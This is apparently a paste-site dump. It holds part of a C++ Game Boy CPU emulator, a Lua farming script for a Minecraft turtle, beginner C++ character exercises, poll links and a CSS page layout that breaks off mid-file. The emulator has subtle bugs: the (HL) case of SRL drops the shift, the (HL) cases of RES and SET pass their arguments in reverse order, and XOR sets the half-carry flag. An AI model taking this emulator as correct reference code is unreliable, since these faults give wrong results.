    case 0xFD:
        /* Empty Instruction */
        std::printf(""Empty Instruction"");
        break;
    case 0xFE:
        logic8bitCP(mem->readByte(PC));
        PC++;
        break;
    case 0xFF:
        rst(0x38);
        break;
    }
}

void SM83::executePrefixedInstruction(uint8_t opcode)
{
    PC++;
    lastCycleCount = prefixedinstructionCount[opcode];
    switch (opcode)
    {
    case 0x0:
        B = RLC(B);
        break;
    case 0x1:
        C = RLC(C);
        break;
    case 0x2:
        D = RLC(D);
        break;
    case 0x3:
        E = RLC(E);
        break;
    case 0x4:
        H = RLC(H);
        break;
    case 0x5:
        L = RLC(L);
        break;
    case 0x6:
        mem->writeByte(HL(), RLC(mem->readByte(HL())));
        break;
    case 0x7:
        A = RLC(A);
        break;
    case 0x8:
        B = RRC(B);
        break;
    case 0x9:
        C = RRC(C);
        break;
    case 0xA:
        D = RRC(D);
        break;
    case 0xB:
        E = RRC(E);
        break;
    case 0xC:
        H = RRC(H);
        break;
    case 0xD:
        L = RRC(L);
        break;
    case 0xE:
        mem->writeByte(HL(), RRC(mem->readByte(HL())));
        break;
    case 0xF:
        A = RRC(A);
        break;
    case 0x10:
        B = RL(B);
        break;
    case 0x11:
        C = RL(C);
        break;
    case 0x12:
        D = RL(D);
        break;
    case 0x13:
        E = RL(E);
        break;
    case 0x14:
        H = RL(H);
        break;
    case 0x15:
        L = RL(L);
        break;
    case 0x16:
        mem->writeByte(HL(), RL(mem->readByte(HL())));
        break;
    case 0x17:
        A = RL(A);
        break;
    case 0x18:
        B = RR(B);
        break;
    case 0x19:
        C = RR(C);
        break;
    case 0x1A:
        D = RR(D);
        break;
    case 0x1B:
        E = RR(E);
        break;
    case 0x1C:
        H = RR(H);
        break;
    case 0x1D:
        L = RR(L);
        break;
    case 0x1E:
        mem->writeByte(HL(), RR(mem->readByte(HL())));
        break;
    case 0x1F:
        A = RR(A);
        break;
    case 0x20:
        B = SLA(B);
        break;
    case 0x21:
        C = SLA(C);
        break;
    case 0x22:
        D = SLA(D);
        break;
    case 0x23:
        E = SLA(E);
        break;
    case 0x24:
        H = SLA(H);
        break;
    case 0x25:
        L = SLA(L);
        break;
    case 0x26:
        mem->writeByte(HL(), SLA(mem->readByte(HL())));
        break;
    case 0x27:
        A = SLA(A);
        break;
    case 0x28:
        B = SRA(B);
        break;
    case 0x29:
        C = SRA(C);
        break;
    case 0x2A:
        D = SRA(D);
        break;
    case 0x2B:
        E = SRA(E);
        break;
    case 0x2C:
        H = SRA(H);
        break;
    case 0x2D:
        L = SRA(L);
        break;
    case 0x2E:
        mem->writeByte(HL(), SRA(mem->readByte(HL())));
        break;
    case 0x2F:
        A = SRA(A);
        break;
    case 0x30:
        B = SWAP(B);
        break;
    case 0x31:
        C = SWAP(C);
        break;
    case 0x32:
        D = SWAP(D);
        break;
    case 0x33:
        E = SWAP(E);
        break;
    case 0x34:
        H = SWAP(H);
        break;
    case 0x35:
        L = SWAP(L);
        break;
    case 0x36:
        mem->writeByte(HL(), SWAP(mem->readByte(HL())));
        break;
    case 0x37:
        A = SWAP(A);
        break;
    case 0x38:
        B = SRL(B);
        break;
    case 0x39:
        C = SRL(C);
        break;
    case 0x3A:
        D = SRL(D);
        break;
    case 0x3B:
        E = SRL(E);
        break;
    case 0x3C:
        H = SRL(H);
        break;
    case 0x3D:
        L = SRL(L);
        break;
    case 0x3E:
        mem->writeByte(HL(), mem->readByte(HL()));
        break;
    case 0x3F:
        A = SRL(A);
        break;
    case 0x40:
        BIT(0, B);
        break;
    case 0x41:
        BIT(0, C);
        break;
    case 0x42:
        BIT(0, D);
        break;
    case 0x43:
        BIT(0, E);
        break;
    case 0x44:
        BIT(0, H);
        break;
    case 0x45:
        BIT(0, L);
        break;
    case 0x46:
        BIT(0, mem->readByte(HL()));
        break;
    case 0x47:
        BIT(0, A);
        break;
    case 0x48:
        BIT(1, B);
        break;
    case 0x49:
        BIT(1, C);
        break;
    case 0x4A:
        BIT(1, D);
        break;
    case 0x4B:
        BIT(1, E);
        break;
    case 0x4C:
        BIT(1, H);
        break;
    case 0x4D:
        BIT(1, L);
        break;
    case 0x4E:
        BIT(1, mem->readByte(HL()));
        break;
    case 0x4F:
        BIT(1, A);
        break;
    case 0x50:
        BIT(2, B);
        break;
    case 0x51:
        BIT(2, C);
        break;
    case 0x52:
        BIT(2, D);
        break;
    case 0x53:
        BIT(2, E);
        break;
    case 0x54:
        BIT(2, H);
        break;
    case 0x55:
        BIT(2, L);
        break;
    case 0x56:
        BIT(2, mem->readByte(HL()));
        break;
    case 0x57:
        BIT(2, A);
        break;
    case 0x58:
        BIT(3, B);
        break;
    case 0x59:
        BIT(3, C);
        break;
    case 0x5A:
        BIT(3, D);
        break;
    case 0x5B:
        BIT(3, E);
        break;
    case 0x5C:
        BIT(3, H);
        break;
    case 0x5D:
        BIT(3, L);
        break;
    case 0x5E:
        BIT(3, mem->readByte(HL()));
        break;
    case 0x5F:
        BIT(3, A);
        break;
    case 0x60:
        BIT(4, B);
        break;
    case 0x61:
        BIT(4, C);
        break;
    case 0x62:
        BIT(4, D);
        break;
    case 0x63:
        BIT(4, E);
        break;
    case 0x64:
        BIT(4, H);
        break;
    case 0x65:
        BIT(4, L);
        break;
    case 0x66:
        BIT(4, mem->readByte(HL()));
        break;
    case 0x67:
        BIT(4, A);
        break;
    case 0x68:
        BIT(5, B);
        break;
    case 0x69:
        BIT(5, C);
        break;
    case 0x6A:
        BIT(5, D);
        break;
    case 0x6B:
        BIT(5, E);
        break;
    case 0x6C:
        BIT(5, H);
        break;
    case 0x6D:
        BIT(5, L);
        break;
    case 0x6E:
        BIT(5, mem->readByte(HL()));
        break;
    case 0x6F:
        BIT(5, A);
        break;
    case 0x70:
        BIT(6, B);
        break;
    case 0x71:
        BIT(6, C);
        break;
    case 0x72:
        BIT(6, D);
        break;
    case 0x73:
        BIT(6, E);
        break;
    case 0x74:
        BIT(6, H);
        break;
    case 0x75:
        BIT(6, L);
        break;
    case 0x76:
        BIT(6, mem->readByte(HL()));
        break;
    case 0x77:
        BIT(6, A);
        break;
    case 0x78:
        BIT(7, B);
        break;
    case 0x79:
        BIT(7, C);
        break;
    case 0x7A:
        BIT(7, D);
        break;
    case 0x7B:
        BIT(7, E);
        break;
    case 0x7C:
        BIT(7, H);
        break;
    case 0x7D:
        BIT(7, L);
        break;
    case 0x7E:
        BIT(7, mem->readByte(HL()));
        break;
    case 0x7F:
        BIT(7, A);
        break;
    case 0x80:
        B = RES(0, B);
        break;
    case 0x81:
        C = RES(0, C);
        break;
    case 0x82:
        D = RES(0, D);
        break;
    case 0x83:
        E = RES(0, E);
        break;
    case 0x84:
        H = RES(0, H);
        break;
    case 0x85:
        L = RES(0, L);
        break;
    case 0x86:
        mem->writeByte(HL(), RES(mem->readByte(HL()), 0));
        break;
    case 0x87:
        A = RES(0, A);
        break;
    case 0x88:
        B = RES(1, B);
        break;
    case 0x89:
        C = RES(1, C);
        break;
    case 0x8A:
        D = RES(1, D);
        break;
    case 0x8B:
        E = RES(1, E);
        break;
    case 0x8C:
        H = RES(1, H);
        break;
    case 0x8D:
        L = RES(1, L);
        break;
    case 0x8E:
        mem->writeByte(HL(), RES(mem->readByte(HL()), 1));
        break;
    case 0x8F:
        A = RES(1, A);
        break;
    case 0x90:
        B = RES(2, B);
        break;
    case 0x91:
        C = RES(2, C);
        break;
    case 0x92:
        D = RES(2, D);
        break;
    case 0x93:
        E = RES(2, E);
        break;
    case 0x94:
        H = RES(2, H);
        break;
    case 0x95:
        L = RES(2, L);
        break;
    case 0x96:
        mem->writeByte(HL(), RES(mem->readByte(HL()), 2));
        break;
    case 0x97:
        A = RES(2, A);
        break;
    case 0x98:
        B = RES(3, B);
        break;
    case 0x99:
        C = RES(3, C);
        break;
    case 0x9A:
        D = RES(3, D);
        break;
    case 0x9B:
        E = RES(3, E);
        break;
    case 0x9C:
        H = RES(3, H);
        break;
    case 0x9D:
        L = RES(3, L);
        break;
    case 0x9E:
        mem->writeByte(HL(), RES(mem->readByte(HL()), 3));
        break;
    case 0x9F:
        A = RES(3, A);
        break;
    case 0xA0:
        B = RES(4, B);
        break;
    case 0xA1:
        C = RES(4, C);
        break;
    case 0xA2:
        D = RES(4, D);
        break;
    case 0xA3:
        E = RES(4, E);
        break;
    case 0xA4:
        H = RES(4, H);
        break;
    case 0xA5:
        L = RES(4, L);
        break;
    case 0xA6:
        mem->writeByte(HL(), RES(mem->readByte(HL()), 4));
        break;
    case 0xA7:
        A = RES(4, A);
        break;
    case 0xA8:
        B = RES(5, B);
        break;
    case 0xA9:
        C = RES(5, C);
        break;
    case 0xAA:
        D = RES(5, D);
        break;
    case 0xAB:
        E = RES(5, E);
        break;
    case 0xAC:
        H = RES(5, H);
        break;
    case 0xAD:
        L = RES(5, L);
        break;
    case 0xAE:
        mem->writeByte(HL(), RES(mem->readByte(HL()), 5));
        break;
    case 0xAF:
        A = RES(5, A);
        break;
    case 0xB0:
        B = RES(6, B);
        break;
    case 0xB1:
        C = RES(6, C);
        break;
    case 0xB2:
        D = RES(6, D);
        break;
    case 0xB3:
        E = RES(6, E);
        break;
    case 0xB4:
        H = RES(6, H);
        break;
    case 0xB5:
        L = RES(6, L);
        break;
    case 0xB6:
        mem->writeByte(HL(), RES(mem->readByte(HL()), 6));
        break;
    case 0xB7:
        A = RES(6, A);
        break;
    case 0xB8:
        B = RES(7, B);
        break;
    case 0xB9:
        C = RES(7, C);
        break;
    case 0xBA:
        D = RES(7, D);
        break;
    case 0xBB:
        E = RES(7, E);
        break;
    case 0xBC:
        H = RES(7, H);
        break;
    case 0xBD:
        L = RES(7, L);
        break;
    case 0xBE:
        mem->writeByte(HL(), RES(mem->readByte(HL()), 7));
        break;
    case 0xBF:
        A = RES(7, A);
        break;
    case 0xC0:
        B = SET(0, B);
        break;
    case 0xC1:
        C = SET(0, C);
        break;
    case 0xC2:
        D = SET(0, D);
        break;
    case 0xC3:
        E = SET(0, E);
        break;
    case 0xC4:
        H = SET(0, H);
        break;
    case 0xC5:
        L = SET(0, L);
        break;
    case 0xC6:
        mem->writeByte(HL(), SET(mem->readByte(HL()), 0));
        break;
    case 0xC7:
        A = SET(0, A);
        break;
    case 0xC8:
        B = SET(1, B);
        break;
    case 0xC9:
        C = SET(1, C);
        break;
    case 0xCA:
        D = SET(1, D);
        break;
    case 0xCB:
        E = SET(1, E);
        break;
    case 0xCC:
        H = SET(1, H);
        break;
    case 0xCD:
        L = SET(1, L);
        break;
    case 0xCE:
        mem->writeByte(HL(), SET(mem->readByte(HL()), 1));
        break;
    case 0xCF:
        A = SET(1, A);
        break;
    case 0xD0:
        B = SET(2, B);
        break;
    case 0xD1:
        C = SET(2, C);
        break;
    case 0xD2:
        D = SET(2, D);
        break;
    case 0xD3:
        E = SET(2, E);
        break;
    case 0xD4:
        H = SET(2, H);
        break;
    case 0xD5:
        L = SET(2, L);
        break;
    case 0xD6:
        mem->writeByte(HL(), SET(mem->readByte(HL()), 2));
        break;
    case 0xD7:
        A = SET(2, A);
        break;
    case 0xD8:
        B = SET(3, B);
        break;
    case 0xD9:
        C = SET(3, C);
        break;
    case 0xDA:
        D = SET(3, D);
        break;
    case 0xDB:
        E = SET(3, E);
        break;
    case 0xDC:
        H = SET(3, H);
        break;
    case 0xDD:
        L = SET(3, L);
        break;
    case 0xDE:
        mem->writeByte(HL(), SET(mem->readByte(HL()), 3));
        break;
    case 0xDF:
        A = SET(3, A);
        break;
    case 0xE0:
        B = SET(4, B);
        break;
    case 0xE1:
        C = SET(4, C);
        break;
    case 0xE2:
        D = SET(4, D);
        break;
    case 0xE3:
        E = SET(4, E);
        break;
    case 0xE4:
        H = SET(4, H);
        break;
    case 0xE5:
        L = SET(4, L);
        break;
    case 0xE6:
        mem->writeByte(HL(), SET(mem->readByte(HL()), 4));
        break;
    case 0xE7:
        A = SET(4, A);
        break;
    case 0xE8:
        B = SET(5, B);
        break;
    case 0xE9:
        C = SET(5, C);
        break;
    case 0xEA:
        D = SET(5, D);
        break;
    case 0xEB:
        E = SET(5, E);
        break;
    case 0xEC:
        H = SET(5, H);
        break;
    case 0xED:
        L = SET(5, L);
        break;
    case 0xEE:
        mem->writeByte(HL(), SET(mem->readByte(HL()), 5));
        break;
    case 0xEF:
        A = SET(5, A);
        break;
    case 0xF0:
        B = SET(6, B);
        break;
    case 0xF1:
        C = SET(6, C);
        break;
    case 0xF2:
        D = SET(6, D);
        break;
    case 0xF3:
        E = SET(6, E);
        break;
    case 0xF4:
        H = SET(6, H);
        break;
    case 0xF5:
        L = SET(6, L);
        break;
    case 0xF6:
        mem->writeByte(HL(), SET(mem->readByte(HL()), 6));
        break;
    case 0xF7:
        A = SET(6, A);
        break;
    case 0xF8:
        B = SET(7, B);
        break;
    case 0xF9:
        C = SET(7, C);
        break;
    case 0xFA:
        D = SET(7, D);
        break;
    case 0xFB:
        E = SET(7, E);
        break;
    case 0xFC:
        H = SET(7, H);
        break;
    case 0xFD:
        L = SET(7, L);
        break;
    case 0xFE:
        mem->writeByte(HL(), SET(mem->readByte(HL()), 7));
        break;
    case 0xFF:
        A = SET(7, A);
        break;
    default:
        break;
    }
}

uint16_t SM83::AF()
{
    return (A << 8) | (F & 0xF0);
}

uint16_t SM83::BC()
{
    return (B << 8) | C;
}

uint16_t SM83::DE()
{
    return (D << 8) | E;
}

uint16_t SM83::HL()
{
    return (H << 8) | L;
}

void SM83::setAF(uint16_t data)
{
    A = (data >> 8) & 0xFF;
    F = data & 0xF0;
}

void SM83::setBC(uint16_t data)
{
    B = (data >> 8) & 0xFF;
    C = data & 0xFF;
}

void SM83::setDE(uint16_t data)
{
    D = (data >> 8) & 0xFF;
    E = data & 0xFF;
}

void SM83::setHL(uint16_t data)
{
    H = (data >> 8) & 0xFF;
    L = data & 0xFF;
}

void SM83::setFlag(uint8_t flag, bool state)
{
    if (state)
    {
        F |= (1 << flag);
    }
    else
    {
        F &= ~(1 << flag);
    }
}

bool SM83::getFlag(uint8_t flag)
{
    return (F & (1 << flag)) != 0;
}

bool SM83::getFlagZ()
{
    return (F & Flag_Z) != 0;
}

bool SM83::getFlagC()
{
    return (F & Flag_C) != 0;
}

void SM83::alu16bitADD(uint16_t data)
{
    uint16_t hl = HL();
    uint32_t result = hl + data;
    setHL(result & 0xFFFF);
    setFlag(Flag_N, false);
    setFlag(Flag_H, ((hl & 0x0FFF) + (data & 0x0FFF)) > 0x0FFF);
    setFlag(Flag_C, result > 0xFFFF);
}

void SM83::alu16bitSPADD()
{
    int8_t data = (int8_t)mem->readByte(PC++);
    uint16_t tmp = SP;
    uint16_t result = SP + data;
    setFlag(Flag_Z, false);
    setFlag(Flag_N, false);
    setFlag(Flag_H, ((tmp & 0x0F) + (data & 0x0F)) > 0x0F);
    setFlag(Flag_C, ((tmp & 0xFF) + (data & 0xFF)) > 0xFF);
    SP = result;
}

void SM83::alu8bitADD(uint8_t data)
{
    uint8_t tmp = A;
    A += data;
    setFlag(Flag_Z, (A == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, ((tmp & 0x0F) + (data & 0x0F)) > 0x0F);
    setFlag(Flag_C, (tmp + data > 0xFF));
}

void SM83::alu8bitADC(uint8_t data, bool carry)
{
    uint8_t tmp = A;
    uint8_t carryValue = carry ? 1 : 0;
    A += data + carryValue;
    setFlag(Flag_Z, (A == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, ((tmp & 0x0F) + (data & 0x0F) + carryValue) > 0x0F);
    setFlag(Flag_C, (tmp + data + carryValue) > 0xFF);
}

void SM83::alu8bitSUB(uint8_t data)
{
    uint8_t tmp = A;
    A -= data;
    setFlag(Flag_Z, (A == 0));
    setFlag(Flag_N, true);
    setFlag(Flag_H, (tmp & 0x0F) < (data & 0x0F));
    setFlag(Flag_C, (A > tmp));
}

void SM83::alu8bitSBC(uint8_t data, bool carry)
{
    uint8_t tmp = A;
    uint8_t carryValue = carry ? 1 : 0;
    A -= (data + carryValue);
    setFlag(Flag_Z, (A == 0));
    setFlag(Flag_N, true);
    setFlag(Flag_H, ((tmp & 0x0F) < ((data & 0x0F) + carryValue)));
    setFlag(Flag_C, (tmp < (data + carryValue)));
}

uint8_t SM83::alu8bitINC(uint8_t data)
{
    uint8_t tmp = data;
    data++;
    setFlag(Flag_Z, (data == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, (tmp & 0x0F) == 0x0F);
    return data;
}

uint8_t SM83::alu8bitDEC(uint8_t data)
{
    uint8_t tmp = data;
    data--;
    setFlag(Flag_Z, (data == 0));
    setFlag(Flag_N, true);
    setFlag(Flag_H, (tmp & 0x0F) == 0);
    return data;
}

void SM83::logic8bitAND(uint8_t data)
{
    A &= data;
    setFlag(Flag_Z, (A == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, true);
    setFlag(Flag_C, false);
}

void SM83::logic8bitOR(uint8_t data)
{
    A |= data;
    setFlag(Flag_Z, (A == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, false);
}

void SM83::logic8bitXOR(uint8_t data)
{
    A ^= data;
    setFlag(Flag_Z, (A == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, true);
    setFlag(Flag_C, false);
}

void SM83::logic8bitCP(uint8_t data)
{
    uint8_t result = A - data;
    setFlag(Flag_Z, (result == 0));
    setFlag(Flag_N, true);
    setFlag(Flag_H, ((A & 0x0F) < (data & 0x0F)));
    setFlag(Flag_C, (A < data));
}

void SM83::logic8bitDAA()
{
    uint8_t correction = 0;
    bool carry = false;
    if (getFlag(Flag_H) || (!getFlag(Flag_N) && (A & 0x0F) > 9))
    {
        correction |= 0x06;
    }
    if (getFlag(Flag_C) || (!getFlag(Flag_N) && A > 0x99))
    {
        correction |= 0x60;
        carry = true;
    }
    if (getFlag(Flag_N))
    {
        A -= correction;
    }
    else
    {
        A += correction;
    }
    setFlag(Flag_Z, (A == 0));
    setFlag(Flag_H, false);
    setFlag(Flag_C, carry);
}

void SM83::logic8bitCPL()
{
    A = ~A;
    setFlag(Flag_N, true);
    setFlag(Flag_H, true);
}

uint8_t SM83::RLC(uint8_t data)
{
    uint8_t result = data;
    bool carry = (result & 0x80) != 0;
    result = (result << 1) | (uint8_t)carry;
    setFlag(Flag_Z, (result == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, carry);
    return result;
}

uint8_t SM83::RL(uint8_t data)
{
    uint8_t result = data;
    bool carryFlagBit = getFlagC();
    bool carry = (result & 0x80) != 0;
    result = (result << 1) | (carryFlagBit);
    setFlag(Flag_Z, (result == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, carry);
    return result;
}

uint8_t SM83::RRC(uint8_t data)
{
    uint8_t result = data;
    bool carry = (result & 0x1) != 0;
    result = (result >> 1) | (carry << 7);
    setFlag(Flag_Z, (result == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, carry);
    return result;
}

uint8_t SM83::RR(uint8_t data)
{
    uint8_t result = data;
    bool carryFlagBit = getFlagC();
    bool carry = (result & 0x01) != 0;
    result = (result >> 1) | (carryFlagBit << 7);
    setFlag(Flag_Z, (result == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, carry);
    return result;
}

uint8_t SM83::SLA(uint8_t data)
{
    uint8_t result = data;
    bool carry = (result & 0x80) != 0;
    result = result << 1;
    setFlag(Flag_Z, (result == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, carry);
    return result;
}

uint8_t SM83::SRA(uint8_t data)
{
    int8_t result = (int8_t)data;
    bool carry = (result & 0x01) != 0;
    result = result >> 1;
    setFlag(Flag_Z, (result == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, carry);
    return (uint8_t)result;
}

uint8_t SM83::SRL(uint8_t data)
{
    uint8_t result = data;
    bool carry = (result & 0x01) != 0;
    result = result >> 1;
    setFlag(Flag_Z, (result == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, carry);
    return (uint8_t)result;
}

uint8_t SM83::SWAP(uint8_t data)
{
    uint8_t result = (data & 0xF0) >> 4;
    result |= data << 4;
    setFlag(Flag_Z, (result == 0));
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, false);
    return result;
}

void SM83::BIT(int bit, uint8_t data)
{
    bool result = (data & (1 << bit)) == 0;
    setFlag(Flag_Z, result);
    setFlag(Flag_N, false);
    setFlag(Flag_H, true);
}

uint8_t SM83::SET(int bit, uint8_t data)
{
    uint8_t setBit = 1 << bit;
    uint8_t result = data | setBit;
    return result;
}

uint8_t SM83::RES(int bit, uint8_t data)
{
    uint8_t resetBit = ~(1 << bit);
    uint8_t result = data & resetBit;
    return result;
}

void SM83::jp(bool state)
{
    if (state)
    {
        lastCycleCount = 16;
        PC = mem->readWord(PC);
    }
    else
    {
        PC += 2;
    }
}

void SM83::jr(bool state)
{
    if (state)
    {
        lastCycleCount = 12;
        int8_t offset = (int8_t)mem->readByte(PC++);
        PC += offset;
    }
    else
    {
        PC++;
    }
}

void SM83::call(bool state)
{
    if (state)
    {
        uint16_t returnAddress = PC + 2;
        SP -= 2;
        mem->writeWord(SP, returnAddress);
        PC = mem->readWord(PC);
        lastCycleCount = 24;
    }
    else
    {
        PC += 2;
    }
}

void SM83::ret(bool state)
{
    if (state)
    {
        lastCycleCount = 20;
        uint16_t address = mem->readWord(SP);
        SP += 2;
        PC = address;
    }
}

void SM83::reti(void)
{
    ret(true);
    IME = true;
    IMEhold = true;
    lastCycleCount = 16;
}

void SM83::rst(uint8_t data)
{
    SP -= 2;
    mem->writeWord(SP, PC);
    PC = data;
}

void SM83::ccf(void)
{
    setFlag(Flag_C, !getFlagC());
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
}

void SM83::scf(void)
{
    setFlag(Flag_N, false);
    setFlag(Flag_H, false);
    setFlag(Flag_C, true);
}

void SM83::nop(void)
{
}

void SM83::halt(void)
{
    ishalt = true;
    if (!IME && ((mem->readByte(IFaddress) & mem->readByte(IEaddress)) != 0))
    {
        ishalt = false;
        PC--;
    }
}

void SM83::stop(void)
{
    uint8_t key1 = mem->readByte(0xFF4D);

    if ((key1 & 0x1) == 0x1)
    {
        DoubleSpeed = !DoubleSpeed;
    }

    mem->writeByte(0xFF4D, (key1 & 0x7E) | ((DoubleSpeed ? 1 : 0) << 7));
}

void SM83::di(void)
{
    IMEhold = false;
    EIDIFlag = true;
}

void SM83::ei(void)
{
    IMEhold = true;
    EIDIFlag = true;
}"
UXagg0Sb,farming.lua,PasteMrBin,Lua,Sunday 23rd of March 2025 12:11:18 PM CDT,"-- programma per farming

function farmingForward(numBlocksY)
    
    turtle.select(2)

    for i = 1, numBlocksY, 1 do
        turtle.digDown()
        turtle.placeDown()
        turtle.forward()
    end
end

function turnLeft()
    
    turtle.turnLeft()
    turtle.forward()
    turtle.turnLeft()
    turtle.forward()
end

function turnRight()

    turtle.turnRight()
    turtle.forward()
    turtle.turnRight()
    turtle.forward()
end

function backHome(numBlocksX, numBlocksY, pariDispari)

    if pariDispari % 2 ~= 0 then

        for i = 1, numBlocksY, 1 do
            turtle.forward()
        end

        turtle.turnLeft()

        for i = 1, numBlocksX, 1 do
            turtle.forward()
        end

    else
        turtle.turnRight()
        for i = 1, numBlocksX, 1 do
            turtle.forward()
        end
    end
end

function farming(numBlocksX, numBlocksY)
    turtle.up()
    turtle.forward()

    for i = 1, numBlocksX, 1 do
        farmingForward(numBlocksY)
        if i % 2 == 0 then
            turnRight()
        else
            turnLeft()
        end
    end
end

farming(8, 8)
"
GzSLsUsw,Untitled,hubertzoo90,C++,Sunday 23rd of March 2025 12:07:16 PM CDT,"#include <iostream>
using namespace std;
 
int main() {
    char c;
    cin >> c;
    
    if(isalpha(c)) {
        if(islower(c)) {
            cout << ""MALA BUKVA"" << endl;
        }
        else {
            cout << ""GOLEMA BUKVA"" << endl;
        }
    }
    return 0;
}"
6G4Tqapk,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 12:05:10 PM CDT,"#include <iostream>
using namespace std;

int main() {
    char c;
    cin >> c;
    
    if(isalnum(c) == false) {
        cout << ""SPECIJALEN ZNAK"" << endl;
    }
    else {
        cout << ""NE E SPECIJALEN ZNAK"" << endl;
    }
    return 0;
}
"
SBsb9Krn,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 12:02:56 PM CDT,"#include <iostream>
using namespace std;

int main() {
    char c;
    cin >> c;
    
    if(isalnum(c)) {
        cout << ""CIFRA ILI BUKVA"" << endl;
    }
    else {
        cout << ""NE E CIFRA NITU BUKVA"" << endl;
    }
    return 0;
}
"
gzfeecSJ,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 12:01:16 PM CDT,"#include <iostream>
using namespace std;

int main() {
    char c;
    cin >> c;
    
    if(isdigit(c)) {
        cout << ""CIFRA"" << endl;
    }
    else {
        cout << ""NE E CIFRA"" << endl;
    }
    return 0;
}
"
TXtc6Njg,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 12:00:00 PM CDT,"#include <iostream>
using namespace std;

int main() {
    char c;
    cin >> c;
    
    if(isalpha(c)) {
        if(islower(c)) {
            cout << ""MALA BUKVA"" << endl;
        }
        else {
            cout << ""GOLEMA BUKVA"" << endl;
        }
    }
    return 0;
}
"
28v30ih5,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 11:51:43 AM CDT,"#include <iostream>
using namespace std;

int main() {
    string s;
    cin >> s;
    
    for(int i = 0; i < s.size(); i++) {
        cout << s[i] << endl;
    }
    return 0;
}
"
mrRrLphV,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 11:48:07 AM CDT,"#include <iostream>
using namespace std;

int main() {
    char c = 'A';
    
    cout << c << endl;
    return 0;
}
"
k7ekcruE,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 11:45:21 AM CDT,"#include <iostream>
using namespace std;

int presmetaj(int a, int b)
{
    int c=1;
    for (int i=1; i<=b; i++)
    {
        c*=a;
    }
    return c;
}
int main() {
    
    int x, y;
    cin >> x >> y;
    cout<<presmetaj(x,y);
    
    return 0;
}
"
CtSSGzeu,the last 2,vuseless,HTML,Sunday 23rd of March 2025 11:40:40 AM CDT,"poal.me/lbglpa
poal.me/14xua7

<--- 2 left --->"
jYhdH6AC,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 11:30:18 AM CDT,"#include <iostream>
using namespace std;

void pecati(int x) {
    for(int i = 1; i <= x; i++) {
        cout << i << "" "";
    }
}

int main() {
    pecati(10);
    return 0;
}
"
TeeFFEWC,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 11:27:21 AM CDT,"#include <iostream>
using namespace std;

int zbir(int a, int b) {
    return a + b;
}

int main() {
    int a, b;
    cin >> a >> b;
    
    cout << zbir(a, b) << endl;
    
    return 0;
}
"
inttzfGs,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 11:24:54 AM CDT,"#include <iostream>
using namespace std;

void pecati(int x) {
    cout << x << endl;
}

int main() {
    pecati(10);
    pecati(15);
    pecati(20);
    
    return 0;
}
"
6Pi15jJT,ᴀʀᴇ ʏᴏᴜ ᴅʀᴜɴᴋ? ɪ'ᴍ ᴀ ᴘᴏᴇᴛ.,wilderanima,CSS,Sunday 23rd of March 2025 11:22:07 AM CDT,"<style>

 @import url('https://fonts.googleapis.com/css2?family=Economica&display=swap');

 @font-face {font-family:'new'; src:url(https://dl.dropbox.com/s/qh3eg64wb150sho/TheRacoonQuestDemo-Regular.otf?dl=0);} 
 @font-face {font-family:'typewriter'; src:url(https://dl.dropboxusercontent.com/scl/fi/xnsezr8azwhe6imm0dt4h/OCEANSIDE-TYPEWRITER.ttf?rlkey=g52e9pnv9sd4se7sdkj09yygw&st=arecyzrb&dl=0);}

body {cursor: url(https://66.media.tumblr.com/232c090ebdd37ae4bc17adb54e1e0344/tumblr_inline_ol4nwhvSwg1uxxza6_1280.png), auto;
 background-color: #000; background-image: url(""https://www.transparenttextures.com/patterns/black-mamba.png"");}

::-webkit-scrollbar {display: none;}

.wilder {
 position: fixed;
 bottom: 0px;
 right: 0px;}

.container {
 position: absolute;
 margin: auto;
 top: 0px;
 bottom: 0px;
 left: 0px;
 right: 0px;
 height: 380px;
 width: 900px;
 background-color: transparent;}

.image1 {
 position: absolute;
 margin: auto;
 top: 10px;
 left: 10px;
 background: url(https://placehold.co/360x360.png); /* top left */
 background-size: cover;
 background-position:;
 height: 360px;
 width: 360px;
 border-outline: 1px solid #000;
 filter:drop-shadow(0px 0px 3px #000);
 opacity: 1;
 z-index:999;}

.title1 {
 position: absolute;
 margin: auto;
 top: -65px;
 right: 100px;
 font-family: new;
 font-size: 65px;
 letter-spacing: 0px;
 text-transform: none;
 color: #999999;
 filter:drop-shadow(0px 0px 2px #999999);
 opacity: 1;
 z-index: 9999999;}

.words1 {
 position: absolute;
 top: 5px;
 left: 380px; 
 height: 335px; 
 width: 200px; 
 padding: 5px; 
 text-align: justify; 
 font-family: economica; 
 font-size: 13px; 
 overflow: auto; 
 color: #FEFEFE; 
 background-color: #000;
 border-outline: 1px solid #000;
 filter:drop-shadow(0px 0px 2px #000);
 z-index: 999;}

.put {
 position: absolute; 
 top: 0px; 
 left: auto; 
 margin: auto; 
 overflow: auto;
 overflow-x: hidden;
 opacity: 1; 
 height: auto; 
 width: 200px; 
 padding: 0px; 
 font-size: 1px; 
 z-index: 999;}

 p.td {text-align: right; font-family:economica; margin-left: 0px; font-size: 13px; line-height: 15px; color: #FEFEFE; }

td {
 text-align: left;
 line-height: 20px;}

.words2 {
